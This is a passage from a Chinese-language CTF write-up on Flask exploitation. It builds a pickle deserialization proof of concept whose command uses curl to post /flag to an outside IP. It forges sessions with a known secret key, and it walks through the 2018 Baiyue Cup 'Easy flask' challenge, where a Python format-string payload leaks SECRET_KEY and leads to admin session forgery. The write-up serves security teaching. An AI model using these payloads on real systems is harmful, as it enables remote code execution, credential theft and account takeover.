[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0127742a93f3f4a53b.png)

有了 `secret_key` 之后，我们开始构造 pickle 反序列化执行命令的 POC：

```
import pickle
import base64
class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('curl 47.101.57.72:2333 -d \"`cat /flag`\"')",))
poc = A()
result = pickle.dumps(poc)
result = base64.b64encode(result)
print(result)

# 生成 Poc: Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMnX19pbXBvcnRfXyhcJ29zXCcpLnN5c3RlbShcJ2N1cmwgNDcuMTAxLjU3LjcyOjIzMzMgLWQgImBjYXQgL2ZsYWdgIlwnKScKcDEKdHAyClJwMwou
```

然后使用 `secret_key` 伪造 Session：

```
python3 flask_session_cookie_manager3.py encode -t "`{`\"u\":`{`\"b\":\"Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMnX19pbXBvcnRfXyhcJ29zXCcpLnN5c3RlbShcJ2N1cmwgNDcuMTAxLjU3LjcyOjIzMzMgLWQgImBjYXQgL2ZsYWdgIlwnKScKcDEKdHAyClJwMwou\"`}``}`" -s "glzjin22948575858jfjfjufirijidjitg3uiiuuh"
```

[![](https://p4.ssl.qhimg.com/t01d842467f61de12e4.png)](https://p4.ssl.qhimg.com/t01d842467f61de12e4.png)

用生成的 Session 替换原来的 Session，然后访问 /admin 路由即可在 VPS 上面接收到flag：

[![](https://p4.ssl.qhimg.com/t01a42680d8a17847a8.png)](https://p4.ssl.qhimg.com/t01a42680d8a17847a8.png)



## Python 格式化字符串漏洞

在C语言里有一类特别有趣的漏洞，叫做格式化字符串漏洞，其危害性不仅可以破坏内存，还可以读写任意地址内容。而在Python中也有格式化字符串的方法，然而当我们使用的方式不正确的时候，即格式化的字符串能够被我们控制时，就会导致一些严重的问题，比如获取敏感信息等。主要有以下几种：
- **百分号形式进行格式化字符串**
```
&gt;&gt;&gt; "My name is %s" % ('whoami', )
"My name is whoami"

&gt;&gt;&gt; "My name is %(name)%" % `{`'name':'whoami'`}`
"My name is whoami"
```
- **使用format进行格式化字符串**
```
&gt;&gt;&gt; "My name is `{``}`".format('whoami')
"My name is whoami"

&gt;&gt;&gt; "My name is `{`name`}`".format(name='whoami')
"My name is whoami"
```
- **使用标准库中的模板字符串**
string.Template()：在python中Template可以将字符串的格式固定下来，重复利用。

```
&gt;&gt;&gt; from string import Template
&gt;&gt;&gt; username = 'whoami'
&gt;&gt;&gt; s = Template('My name is $name')
&gt;&gt;&gt; s.substitute(name=username)
'My name is Hu3sky'
```

但因为我们控制了格式化字符串的一部分，将会导致一些意料之外的问题，导致一些敏感信息被泄露，如下实例：

```
&gt;&gt;&gt; 'Hello `{`name`}`'.format(name=user.__class__.__init__.__globals__)
"Hello `{`'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': `{``}`, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'config': `{`'SECRET_KEY': 'f0ma7_t3st'`}`, 'User': &lt;class '__main__.User'&gt;, 'user': &lt;__main__.User object at 0x03242EF0&gt;`}`"
```

可以看到，当我们的 `name=user.__class__.__init__.__globals__` 时，就可以将很多敏感的东西给打印出来。可以看到 Python 格式化字符串漏洞与 SSTI 有类似之处。

### <a class="reference-link" name="2018%E7%99%BE%E8%B6%8A%E6%9D%AFEasy%20flask"></a>2018百越杯Easy flask

打开题目，有注册和登陆接口，先随便注册一个账号并登录：

[![](https://p2.ssl.qhimg.com/t01de7f18f6b9e1de9e.png)](https://p2.ssl.qhimg.com/t01de7f18f6b9e1de9e.png)

提示我们应该用admin用户登录，我们观察 url 处的 views?id=6，于是我们修改id，发现可以遍历用户，在id=5时是admin的信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0125e115a8f2039ae5.png)

并且，在用户页面还存在着一个“edit secert”功能：

[![](https://p1.ssl.qhimg.com/t01d341356779c15b78.png)](https://p1.ssl.qhimg.com/t01d341356779c15b78.png)

[![](https://p3.ssl.qhimg.com/t01a4be7ffaf6f3a1e6.png)](https://p3.ssl.qhimg.com/t01a4be7ffaf6f3a1e6.png)

通过www-zip下载到源码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a4751968608f00a2.png)

查看auth.py的代码：

```
...//省略
@bp_auth.route('/flag')
@login_check
def get_flag():
    if(g.user.username=="admin"):
        with open(os.path.dirname(__file__)+'/flag','rb') as f:
            flag = f.read()
        return flag
    return "Not admin!!"
...//省略
```

从auth可以看到，当用户是admin的时候才可以访问/flag得到flag。

在查看secert.py的代码：

```
...//省略
bp_secert = Blueprint('secert', __name__, url_prefix='/')

@bp_secert.route('/views',methods = ['GET','POST'])
@login_check
def views_info():
    view_id = request.args.get('id')
    if not view_id:
        view_id = session.get('user_id')

    user_m = user.query.filter_by(id=view_id).first()    # 获取用户信息

    if user_m is None:
        flash(u"该用户未注册")
        return render_template('secert/views.html')

    if str(session.get('user_id'))==str(view_id):
        secert_m = secert.query.filter_by(id=view_id).first()    # 获取secert信息
        secert_t = u"&lt;p&gt;`{`secert.secert`}`&lt;p&gt;".format(secert = secert_m)    // 第一处format
    else:
        secert_t = u"&lt;p&gt;***************************************&lt;p&gt;"

    name = u"&lt;h1&gt;name:`{`user_m.username`}`&lt;h1&gt;"
    email = u"&lt;h2&gt;email:`{`user_m.email`}`&lt;h2&gt;"

    info = (name+email+secert_t).format(user_m=user_m)    // 第二处format
    return render_template('secert/views.html',info = info)


@bp_secert.route('/edit',methods = ['GET','POST'])
@login_check
def edit_secert():
    if request.method=='POST':
        secert_new = request.form.get('secert')
        error = None

        if not secert_new:
            error = u'请输入你的秘密'

        if error is None:
            secert.query.filter_by(id = session.get('user_id')).update(`{`'secert':secert_new`}`)
            db.session.commit()
            return redirect(url_for('secert.views_info'))
        flash(error)

    return render_template('secert/edit.html')
```

在已登录的用户里发现了flask session，如图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010340dff3747d5b90.png)

将其解密得到：

[![](https://p3.ssl.qhimg.com/t01962c86fb33c6a14b.png)](https://p3.ssl.qhimg.com/t01962c86fb33c6a14b.png)

现在思路很明确了，我们通过flask session伪造成admin用户，然后访问/flag即可得到flag，那么现在就要想办法拿到SECRET_KEY这样才能伪造session。

在secret.py，存在两处format，第一处的secret是我们可控的，就是edit secert，于是测试当我提交``{`user_m.password`}``时，

[![](https://p1.ssl.qhimg.com/t01a2d8f5cca10fc8f7.png)](https://p1.ssl.qhimg.com/t01a2d8f5cca10fc8f7.png)

出现了sha256加密的密码，所以，我们可以通过这个漏洞点去读SECRET_KEY。我们可以看到，在 secert.py 的开头导入了 current_app，于是可以通过获取 current_app 来获取 SECRET_KEY：

```
`{`user_m.__class__.__mro__[1].__class__.__mro__[0].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config`}`
或
`{`user_m.__class__.__base__.__class__.__init__.__globals__[current_app].config`}`
```

获取到的SECRET_KEY为“test”，然后，我们就可以伪造admin的session了：

[![](https://p0.ssl.qhimg.com/t01bb9146aff9b7e66a.png)](https://p0.ssl.qhimg.com/t01bb9146aff9b7e66a.png)

然后将session换为admin的session即可登录admin用户：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d505c1fb6eb6998e.png)

最后访问/flag路由即可得到flag。

在一般的CTF中，通常格式化字符串漏洞会和session机制的问题，SSTI等一起出现。一般来说，在审计源码的过程中，看到了使用format，且可控，那基本上就可以认为是format格式化字符串漏洞了。

**<a class="reference-link" name="%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD%E2%80%A6%E2%80%A6"></a>未完待续……**
